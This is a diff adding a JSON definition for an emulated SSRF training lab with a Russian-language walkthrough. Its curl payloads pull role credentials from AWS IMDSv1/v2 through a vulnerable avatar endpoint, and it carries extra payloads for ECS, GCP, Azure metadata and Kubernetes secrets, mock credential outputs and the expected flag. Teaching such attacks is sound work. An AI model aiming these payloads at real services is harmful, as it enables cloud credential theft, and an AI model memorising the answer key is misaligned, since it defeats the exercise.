@@ -1,0 +1,28 @@
+{
+  "id": "web-ssrf-cloud-deep",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{1mds_v2_t0k3n_byp4ss_ssrf}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: SSRF в облако — IMDSv1 vs IMDSv2\n\n`shop.local/profile/avatar` ходит по URL из параметра `url`. Машина живёт в AWS.\nСначала имя роли утекает даже в ошибке, но обычный GET к кредам заблокирован\n(включён IMDSv2). Получи сессионный токен через PUT и забери креды роли.\n\n1. Проверь ручку:\n\n   curl -s 'https://shop.local/profile/avatar' -d 'url=http://127.0.0.1:8080/'\n\n2. Узнай имя роли (видно в тексте ошибки):\n\n   curl -s 'https://shop.local/profile/avatar' -d 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'\n\n3. IMDSv1 больше не работает — GET к кредам вернёт ошибку:\n\n   curl -s 'https://shop.local/profile/avatar' -d 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/shop-ec2-role'\n\n4. IMDSv2: сначала PUT за токеном (нужен заголовок TTL):\n\n   curl -s -X PUT 'https://shop.local/profile/avatar' -d 'url=http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'\n\n5. Теперь с токеном забери креды роли (в ответе — флаг):\n\n   curl -s 'https://shop.local/profile/avatar' -d 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/shop-ec2-role' -H 'X-aws-ec2-metadata-token: AQAAAExampleToken' > found.txt\n\n6. Набери `check`.\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local/profile/avatar)",
+      "cases": [
+        { "match": "X-aws-ec2-metadata-token:", "example": "-s '...profile/avatar' -d 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/shop-ec2-role' -H 'X-aws-ec2-metadata-token: AQAAA...'", "output": "{\"error\":\"... \\\"AccessKeyId\\\":\\\"ASIA2EXAMPLEKEY\\\", \\\"SecretAccessKey\\\":\\\"wJalrXUtnFEMI/K7MDENG\\\", \\\"Token\\\":\\\"IQoJb3Jp...\\\", \\\"Flag\\\":\\\"nto{1mds_v2_t0k3n_byp4ss_ssrf}\\\" ...\"}\n" },
+        { "match": "latest/api/token|X-aws-ec2-metadata-token-ttl-seconds", "example": "-s -X PUT '.../profile/avatar' -d 'url=http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'", "output": "{\"error\":\"invalid image header: AQAAAExampleToken\"}\n" },
+        { "match": "security-credentials/shop-ec2-role", "example": "-s '...profile/avatar' -d 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/shop-ec2-role'", "output": "{\"error\":\"invalid image header: {\"code\":\"Unauthorized\",\"message\":\"IMDSv2 token required\"}\"}\n" },
+        { "match": "security-credentials/", "example": "-s '...profile/avatar' -d 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'", "output": "{\"error\":\"invalid image header: shop-ec2-role\"}\n" },
+        { "match": "169\\.254\\.169\\.254/latest/meta-data/", "example": "-s '...profile/avatar' -d 'url=http://169.254.169.254/latest/meta-data/'", "output": "{\"error\":\"invalid image header: ami-id\\ninstance-id\\niam/\\nuser-data\"}\n" },
+        { "match": "169\\.254\\.170\\.2|/v2/credentials/", "example": "-s '...profile/avatar' -d 'url=http://169.254.170.2/v2/credentials/abc'", "output": "{\"error\":\"invalid image header: {\\\"AccessKeyId\\\":\\\"ASIAECS...\\\",\\\"SecretAccessKey\\\":\\\"...\\\"}\"}\n" },
+        { "match": "metadata\\.google\\.internal|Metadata-Flavor", "example": "-s '...profile/avatar' -d 'url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' -H 'Metadata-Flavor: Google'", "output": "{\"error\":\"invalid image header: {\\\"access_token\\\":\\\"ya29.c...\\\"}\"}\n" },
+        { "match": "169\\.254\\.169\\.254/metadata/identity|Metadata: true", "example": "-s '...profile/avatar' -d 'url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01' -H 'Metadata: true'", "output": "{\"error\":\"invalid image header: {\\\"access_token\\\":\\\"eyJ0eX...\\\"}\"}\n" },
+        { "match": "kubernetes\\.default\\.svc", "example": "-s '...profile/avatar' -d 'url=http://kubernetes.default.svc/api/v1/namespaces/default/secrets'", "output": "{\"error\":\"invalid image header: {\\\"items\\\":[{\\\"metadata\\\":{\\\"name\\\":\\\"db-secret\\\"}}]}\"}\n" },
+        { "match": "127\\.0\\.0\\.1:8080", "example": "-s '...profile/avatar' -d 'url=http://127.0.0.1:8080/'", "output": "{\"error\":\"not an image\"}\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только SSRF-ручка shop.local/profile/avatar.\n"
+    }
+  }
+}
